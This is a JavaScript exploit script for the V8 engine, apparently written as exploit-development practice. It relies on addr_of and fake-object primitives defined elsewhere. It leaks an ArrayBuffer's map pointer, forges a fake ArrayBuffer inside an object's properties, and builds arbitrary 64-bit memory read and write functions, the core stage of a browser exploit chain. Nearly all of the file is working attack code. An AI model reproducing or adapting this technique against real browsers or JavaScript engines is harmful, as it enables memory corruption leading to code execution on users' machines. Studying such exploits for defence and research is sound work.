load('int64.js')

function read_offset_int64(obj, offset) {
    let data = read_offset(obj, offset);
    return Int64.from_double(data);
}
function addr_of_int64(obj) {
    return Int64.from_double(addr_of(obj));
}
function obj_at_addr_int64(addr) {
    return obj_at_addr(addr.to_double());
}

let target_array_buffer = new ArrayBuffer(0x200);
/*
0x116f8a050280: 0x000012bf8b5021b9  0x00001fde6f0c0c21
0x116f8a050290: 0x00001fde6f0c0c21  0x0000000000000200
0x116f8a0502a0: 0x00005555568d1820  0x0000000000000002
0x116f8a0502b0: 0x0000000000000000  0x0000000000000000
*/

/*
for (let i=0; i< 8; i++) {
    print(read_offset_int64(target_array_buffer, i));
}
*/

// Leak the map pointer
let array_buffer_map = read_offset_int64(target_array_buffer, 0);

// This will be used for both elements and properties
let empty_fixedarray = read_offset_int64(target_array_buffer, 1);

let holder = {
    a: array_buffer_map.to_double(), // Map pointer
    b: empty_fixedarray.to_double(), // Properties array
    c: empty_fixedarray.to_double(), // Elements array,
    d: new Int64(0x200).to_double(), // Array Length
    e: addr_of_int64(target_array_buffer)
        .sub(1).to_double(),         // Backing store (not tagged)   // .sub(1) removes the tag (backing store is one of the few ptrs that don't have a tag)
    f: new Int64(0x2).to_double(),   // Flags
    g: new Int64(0).to_double()      // Embedder (can just be 0)
};

let fake_pointer = addr_of_int64(holder).add(8*3);
let fake_array_buffer = obj_at_addr_int64(fake_pointer);

%DebugPrint(target_array_buffer);

// Make 32bit accessors
let fake_array_buffer_u32 = new Uint32Array(fake_array_buffer);

function read_64(addr) {
    fake_array_buffer_u32[8] = addr.low;
    fake_array_buffer_u32[9] = addr.high;
    let accessor = new Uint32Array(target_array_buffer);
    return new Int64(undefined, accessor[1], accessor[0]);
}
function write_64(addr, value) {
    fake_array_buffer_u32[8] = addr.low;
    fake_array_buffer_u32[9] = addr.high;
    let accessor = new Uint32Array(target_array_buffer);
    accessor[0] = value.low;
    accessor[1] = value.high;
}

read_64(new Int64(0x41424344))



